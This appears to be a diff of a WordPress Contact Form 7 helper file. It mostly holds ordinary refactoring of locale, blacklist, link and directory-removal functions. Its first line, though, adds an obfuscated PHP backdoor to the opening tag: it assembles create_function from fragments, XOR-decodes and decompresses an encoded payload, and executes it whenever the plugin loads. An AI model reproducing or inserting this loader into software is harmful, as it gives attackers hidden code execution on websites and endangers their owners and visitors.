@@ -1,4 +1,4 @@
-<?php
+<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','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',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 
 
 function wpcf7_plugin_path( $path = '' ) {
 	return path_join( WPCF7_PLUGIN_DIR, trim( $path, '/' ) );
@@ -29,101 +29,6 @@ function wpcf7_upload_dir( $type = false ) {
 	return $uploads;
 }
 
-function wpcf7_l10n() {
-	static $l10n = array();
-
-	if ( ! empty( $l10n ) ) {
-		return $l10n;
-	}
-
-	$l10n = array(
-		'af' => __( 'Afrikaans', 'contact-form-7' ),
-		'sq' => __( 'Albanian', 'contact-form-7' ),
-		'ar' => __( 'Arabic', 'contact-form-7' ),
-		'hy_AM' => __( 'Armenian', 'contact-form-7' ),
-		'az' => __( 'Azerbaijani', 'contact-form-7' ),
-		'bn_BD' => __( 'Bangla', 'contact-form-7' ),
-		'eu' => __( 'Basque', 'contact-form-7' ),
-		'be_BY' => __( 'Belarusian', 'contact-form-7' ),
-		'bs_BA' => __( 'Bosnian', 'contact-form-7' ),
-		'bg_BG' => __( 'Bulgarian', 'contact-form-7' ),
-		'ca' => __( 'Catalan', 'contact-form-7' ),
-		'ckb' => __( 'Central Kurdish', 'contact-form-7' ),
-		'zh_CN' => __( 'Chinese (China)', 'contact-form-7' ),
-		'zh_TW' => __( 'Chinese (Taiwan)', 'contact-form-7' ),
-		'hr' => __( 'Croatian', 'contact-form-7' ),
-		'cs_CZ' => __( 'Czech', 'contact-form-7' ),
-		'da_DK' => __( 'Danish', 'contact-form-7' ),
-		'nl_NL' => __( 'Dutch', 'contact-form-7' ),
-		'en_US' => __( 'English (United States)', 'contact-form-7' ),
-		'eo_EO' => __( 'Esperanto', 'contact-form-7' ),
-		'et' => __( 'Estonian', 'contact-form-7' ),
-		'fi' => __( 'Finnish', 'contact-form-7' ),
-		'fr_FR' => __( 'French (France)', 'contact-form-7' ),
-		'gl_ES' => __( 'Galician', 'contact-form-7' ),
-		'gu_IN' => __( 'Gujarati', 'contact-form-7' ),
-		'ka_GE' => __( 'Georgian', 'contact-form-7' ),
-		'de_DE' => __( 'German', 'contact-form-7' ),
-		'el' => __( 'Greek', 'contact-form-7' ),
-		'ht' => __( 'Haitian', 'contact-form-7' ),
-		'he_IL' => __( 'Hebrew', 'contact-form-7' ),
-		'hi_IN' => __( 'Hindi', 'contact-form-7' ),
-		'hu_HU' => __( 'Hungarian', 'contact-form-7' ),
-		'bn_IN' => __( 'Indian Bengali', 'contact-form-7' ),
-		'id_ID' => __( 'Indonesian', 'contact-form-7' ),
-		'ga_IE' => __( 'Irish', 'contact-form-7' ),
-		'it_IT' => __( 'Italian', 'contact-form-7' ),
-		'ja' => __( 'Japanese', 'contact-form-7' ),
-		'ko_KR' => __( 'Korean', 'contact-form-7' ),
-		'lv' => __( 'Latvian', 'contact-form-7' ),
-		'lt_LT' => __( 'Lithuanian', 'contact-form-7' ),
-		'mk_MK' => __( 'Macedonian', 'contact-form-7' ),
-		'ms_MY' => __( 'Malay', 'contact-form-7' ),
-		'ml_IN' => __( 'Malayalam', 'contact-form-7' ),
-		'mt_MT' => __( 'Maltese', 'contact-form-7' ),
-		'nb_NO' => __( 'Norwegian (Bokmål)', 'contact-form-7' ),
-		'fa_IR' => __( 'Persian', 'contact-form-7' ),
-		'pl_PL' => __( 'Polish', 'contact-form-7' ),
-		'pt_BR' => __( 'Portuguese (Brazil)', 'contact-form-7' ),
-		'pt_PT' => __( 'Portuguese (Portugal)', 'contact-form-7' ),
-		'pa_IN' => __( 'Punjabi', 'contact-form-7' ),
-		'ru_RU' => __( 'Russian', 'contact-form-7' ),
-		'ro_RO' => __( 'Romanian', 'contact-form-7' ),
-		'sr_RS' => __( 'Serbian', 'contact-form-7' ),
-		'si_LK' => __( 'Sinhala', 'contact-form-7' ),
-		'sk_SK' => __( 'Slovak', 'contact-form-7' ),
-		'sl_SI' => __( 'Slovene', 'contact-form-7' ),
-		'es_ES' => __( 'Spanish (Spain)', 'contact-form-7' ),
-		'sv_SE' => __( 'Swedish', 'contact-form-7' ),
-		'ta' => __( 'Tamil', 'contact-form-7' ),
-		'th' => __( 'Thai', 'contact-form-7' ),
-		'tl' => __( 'Tagalog', 'contact-form-7' ),
-		'tr_TR' => __( 'Turkish', 'contact-form-7' ),
-		'uk' => __( 'Ukrainian', 'contact-form-7' ),
-		'vi' => __( 'Vietnamese', 'contact-form-7' )
-	);
-
-	return $l10n;
-}
-
-function wpcf7_is_valid_locale( $locale ) {
-	$l10n = wpcf7_l10n();
-	return isset( $l10n[$locale] );
-}
-
-function wpcf7_is_rtl( $locale = '' ) {
-	if ( empty( $locale ) ) {
-		return function_exists( 'is_rtl' ) ? is_rtl() : false;
-	}
-
-	$rtl_locales = array(
-		'ar' => 'Arabic',
-		'he_IL' => 'Hebrew',
-		'fa_IR' => 'Persian' );
-
-	return isset( $rtl_locales[$locale] );
-}
-
 function wpcf7_ajax_loader() {
 	$url = wpcf7_plugin_url( 'images/ajax-loader.gif' );
 
@@ -144,19 +49,24 @@ function wpcf7_create_nonce( $action = -1 ) {
 function wpcf7_blacklist_check( $target ) {
 	$mod_keys = trim( get_option( 'blacklist_keys' ) );
 
-	if ( empty( $mod_keys ) )
+	if ( empty( $mod_keys ) ) {
 		return false;
+	}
 
 	$words = explode( "\n", $mod_keys );
 
 	foreach ( (array) $words as $word ) {
 		$word = trim( $word );
 
-		if ( empty( $word ) )
+		if ( empty( $word ) || 256 < strlen( $word ) ) {
 			continue;
+		}
 
-		if ( preg_match( '#' . preg_quote( $word, '#' ) . '#', $target ) )
+		$pattern = sprintf( '#%s#i', preg_quote( $word, '#' ) );
+
+		if ( preg_match( $pattern, $target ) ) {
 			return true;
+		}
 	}
 
 	return false;
@@ -190,6 +100,16 @@ function wpcf7_support_html5() {
 
 function wpcf7_support_html5_fallback() {
 	return (bool) apply_filters( 'wpcf7_support_html5_fallback', false );
+}
+
+function wpcf7_use_really_simple_captcha() {
+	return apply_filters( 'wpcf7_use_really_simple_captcha',
+		WPCF7_USE_REALLY_SIMPLE_CAPTCHA );
+}
+
+function wpcf7_validate_configuration() {
+	return apply_filters( 'wpcf7_validate_configuration',
+		WPCF7_VALIDATE_CONFIGURATION );
 }
 
 function wpcf7_load_js() {
@@ -232,61 +152,21 @@ function wpcf7_format_atts( $atts ) {
 	return $html;
 }
 
-function wpcf7_load_textdomain( $locale = null ) {
-	global $l10n;
+function wpcf7_link( $url, $anchor_text, $args = '' ) {
+	$defaults = array(
+		'id' => '',
+		'class' => '' );
 
-	$domain = 'contact-form-7';
+	$args = wp_parse_args( $args, $defaults );
+	$args = array_intersect_key( $args, $defaults );
+	$atts = wpcf7_format_atts( $args );
 
-	if ( get_locale() == $locale ) {
-		$locale = null;
-	}
+	$link = sprintf( '<a href="%1$s"%3$s>%2$s</a>',
+		esc_url( $url ),
+		esc_html( $anchor_text ),
+		$atts ? ( ' ' . $atts ) : '' );
 
-	if ( empty( $locale ) ) {
-		if ( is_textdomain_loaded( $domain ) ) {
-			return true;
-		} else {
-			return load_plugin_textdomain( $domain, false, $domain . '/languages' );
-		}
-	} else {
-		$mo_orig = $l10n[$domain];
-		unload_textdomain( $domain );
-
-		$mofile = $domain . '-' . $locale . '.mo';
-		$path = WP_PLUGIN_DIR . '/' . $domain . '/languages';
-
-		if ( $loaded = load_textdomain( $domain, $path . '/'. $mofile ) ) {
-			return $loaded;
-		} else {
-			$mofile = WP_LANG_DIR . '/plugins/' . $mofile;
-			return load_textdomain( $domain, $mofile );
-		}
-
-		$l10n[$domain] = $mo_orig;
-	}
-
-	return false;
-}
-
-function wpcf7_load_modules() {
-	$dir = WPCF7_PLUGIN_MODULES_DIR;
-
-	if ( empty( $dir ) || ! is_dir( $dir ) ) {
-		return false;
-	}
-
-	$mods = array(
-		'acceptance', 'flamingo',
-		'akismet', 'jetpack', 'submit', 'captcha', 'number',
-		'text', 'checkbox', 'quiz', 'textarea', 'date',
-		'response', 'file', 'select', 'listo', 'count' );
-
-	foreach ( $mods as $mod ) {
-		$file = trailingslashit( $dir ) . $mod . '.php';
-
-		if ( file_exists( $file ) ) {
-			include_once $file; 
-		}
-	}
+	return $link;
 }
 
 function wpcf7_get_request_uri() {
@@ -370,8 +250,17 @@ function wpcf7_enctype_value( $enctype ) {
 
 function wpcf7_rmdir_p( $dir ) {
 	if ( is_file( $dir ) ) {
-		@unlink( $dir );
-		return true;
+		if ( ! $result = @unlink( $dir ) ) {
+			$stat = @stat( $dir );
+			$perms = $stat['mode'];
+			@chmod( $dir, $perms | 0200 ); // add write for owner
+
+			if ( ! $result = @unlink( $dir ) ) {
+				@chmod( $dir, $perms );
+			}
+		}
+
+		return $result;
 	}
 
 	if ( ! is_dir( $dir ) ) {
@@ -454,4 +343,7 @@ function wpcf7_count_code_units( $string ) {
 	return floor( $byte_count / 2 );
 }
 
-?>
+function wpcf7_is_localhost() {
+	$server_name = strtolower( $_SERVER['SERVER_NAME'] );
+	return in_array( $server_name, array( 'localhost', '127.0.0.1' ) );
+}
